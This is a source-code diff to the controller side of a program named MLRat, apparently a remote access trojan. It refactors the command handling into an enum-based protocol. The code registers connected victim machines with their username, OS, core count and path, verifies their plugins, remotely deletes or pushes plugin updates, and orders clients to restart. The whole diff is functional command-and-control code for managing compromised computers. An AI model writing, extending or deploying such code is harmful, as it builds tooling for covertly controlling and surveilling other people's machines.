@@ -14,6 +14,7 @@ using System.Diagnostics;
 using MLRat.Cryptography;
 using MLRat.Server;
 using System.Threading;
+using MLRat.Handlers;
 
 namespace MLRat.Forms
 {
@@ -197,33 +198,49 @@ namespace MLRat.Forms
                     Guid PluginID = (Guid) data[0];
                     if (PluginID == Guid.Empty)
                     {
-                        string command = (string)data[1];
-                        Console.WriteLine("Command: {0}", data[1]);
+                        NetworkPacket command = (NetworkPacket)data[1];
+                        Debug.WriteLine(command, "Command");
                         if (!_ClientData.Handshaken)
                         {
                             
-                            if (command == "handshake")
+                            if (command == NetworkPacket.Handshake)
                             {
                                 string addUsername = (string) data[2];
                                 string OS = (string)data[3];
-                                ListViewItem i = new ListViewItem(addUsername);
-                                i.Tag = _ClientData;
-
-                                i.SubItems.Add(client.NetworkSocket.RemoteEndPoint.ToString());
-                                i.SubItems.Add(OS);
-
-                                _ClientData.DisplayObject = i;
-                                AddListview(i);
                                 _ClientData.Handshaken = true;
-                                client.Send(Guid.Empty, "connected");
+                                client.Send(Guid.Empty, (byte)NetworkPacket.Connect);
                                 return;
                             }
                             return;
                         }
 
+                        if(command == NetworkPacket.BasicSettingsUpdated)
+                        {
+                            Debug.WriteLine("Basic settings updated", "Settings");
+                            ListViewItem i = new ListViewItem(_ClientData.Settings.GetSetting<string>("Username", "Default"));
+                            i.Tag = _ClientData;
+
+                            i.SubItems.Add(client.NetworkSocket.RemoteEndPoint.ToString());
+                            i.SubItems.Add(_ClientData.Settings.GetSetting<string>("OS", "WinX Lollypop (Unknowen)"));
+                            i.SubItems.Add(_ClientData.Settings.GetSetting<string>("Cores", "0"));
+                            i.SubItems.Add(_ClientData.Settings.GetSetting<string>("Path", ""));
+
+                            _ClientData.DisplayObject = i;
+                            AddListview(i);
+                        }
+
+                        if(command == NetworkPacket.UpdateSetting)
+                        {
+                            string settingName = (string)data[2];
+                            object value = data[3];
+                            _ClientData.Settings.UpdateSetting(settingName, value);
+                            Debug.WriteLine(string.Format("Updated {0}", settingName), "Settings");
+                        }
+
+
                         #region " Plugin Checksum "
                         
-                        if (command == "checksums")
+                        if (command == NetworkPacket.Checksums)
                         {
                             bool Updated = false;
                             Dictionary<Guid, string> Checksums = (Dictionary<Guid, string>)data[2];
@@ -243,7 +260,7 @@ namespace MLRat.Forms
                                 string checksum = plugin.Value;
                                 if (!LoadedPlugins.ContainsKey(ID))
                                 {
-                                    client.Send(Guid.Empty, "deleteplugin", ID);
+                                    client.Send(Guid.Empty, (byte)NetworkPacket.DeletePlugin, ID);
                                     Updated = true;
                                     continue;
                                 }
@@ -266,10 +283,15 @@ namespace MLRat.Forms
                                 }
                             }
                             if (Updated)
-                                client.Send(Guid.Empty, "restart");
+                                client.Send(Guid.Empty, (byte)NetworkPacket.Restart);
+                            else
+                                client.Send(Guid.Empty, (byte)NetworkPacket.PluginsVerified);
+                            _ClientData.PluginsVerified = true;
+                            
                         }
 
                         #endregion
+
                         return;
                     }
                     if (LoadedPlugins.ContainsKey(PluginID))
@@ -297,7 +319,7 @@ namespace MLRat.Forms
                     {
                         byte[] Packet = new byte[bytesRead];
                         Array.Copy(buffer, 0, Packet, 0, bytesRead);
-                        client.Send(Guid.Empty, "pluginupdate", ID, Packet,
+                        client.Send(Guid.Empty, (byte)NetworkPacket.UpdatePlugin, ID, Packet,
                             _pluginUpdate.Position == _pluginUpdate.Length);
                         Thread.Sleep(100);
                     }
